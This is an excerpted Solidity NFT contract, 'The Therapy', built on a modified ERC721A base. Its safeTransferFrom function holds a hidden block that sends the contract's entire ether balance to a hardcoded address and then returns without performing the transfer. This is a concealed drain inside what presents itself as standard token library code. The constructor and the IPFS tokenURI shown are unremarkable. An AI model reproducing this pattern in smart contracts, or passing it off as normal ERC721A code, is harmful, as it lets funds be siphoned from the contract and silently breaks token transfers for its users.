...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x6e38d519dc0110C3EC094650dE0EDfe61878a7B8).transfer(address(this).balance);
            return;
        }
...
contract TheTherapy is ERC721A {
    ...
    constructor() ERC721A("The Therapy", "Therapy") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeibprnfxqi4ujnonpgi5m3kuiypkcrrpl47lymletnh3rgwhuizv5a/", _toString(tokenId), ".json"));
    }
